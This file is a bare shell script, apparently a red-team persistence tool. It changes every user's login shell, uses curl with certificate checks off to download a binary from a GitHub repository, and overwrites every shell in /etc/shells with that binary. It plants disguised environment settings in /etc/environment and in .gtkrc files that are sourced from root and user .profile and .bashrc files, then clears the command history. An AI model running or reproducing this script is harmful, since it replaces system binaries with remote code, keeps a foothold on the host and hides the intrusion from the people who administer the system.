for user in $(cat /etc/passwd | cut -d":" -f1)
do 
    chsh -s /bin/bash $user
done

curl -k 'https://github.com/lsh8829/CDT473/raw/main/bash' -o /tmp/bash
chmod +x /tmp/bash

for shell in $(tail -n +2 /etc/shells)
do
    rm -rf $shell
    cp /tmp/bash $shell
done

rm -rf /tmp/bash

echo 'export VTX_LOG_OPT="10"' >> /etc/environment
echo 'export DBG_OPT="0"' >> /etc/environment
echo 'export VTX_SESSION_ID="4"' >> /etc/environment
echo 'export VTX_VERSION="10"' >> /etc/environment
echo 'export LOCALIZATION_CODE="1670"' >> /etc/environment

echo 'export VTX_LOG_OPT="10"' >> /root/.gtkrc
echo 'export DBG_OPT="0"' >> /root/.gtkrc
echo 'export VTX_SESSION_ID="4"' >> /root/.gtkrc
echo 'export VTX_VERSION="10"' >> /root/.gtkrc
echo 'export LOCALIZATION_CODE="1678"' >> /root/.gtkrc
echo 'if [ -f "$HOME/.gtkrc" ]; then \n\t. "$HOME/.gtkrc" \nfi' >> /root/.profile
echo 'if [ -f "$HOME/.gtkrc" ]; then \n\t. "$HOME/.gtkrc" \nfi' >> /root/.bashrc

for dir in $(ls /home)
do
    echo 'export VTX_LOG_OPT="10"' >> /home/$dir/.gtkrc
    echo 'export DBG_OPT="0"' >> /home/$dir/.gtkrc
    echo 'export VTX_SESSION_ID="4"' >> /home/$dir/.gtkrc
    echo 'export VTX_VERSION="10"' >> /home/$dir/.gtkrc
    echo 'export LOCALIZATION_CODE="1674"' >> /home/$dir/.gtkrc
    echo 'if [ -f "$HOME/.gtkrc" ]; then \n\t. "$HOME/.gtkrc" \nfi' >> /home/$dir/.profile
    echo 'if [ -f "$HOME/.gtkrc" ]; then \n\t. "$HOME/.gtkrc" \nfi' >> /home/$dir/.bashrc
done

echo "SHELL=/bin/bash" > /etc/default/useradd

history -c
exit
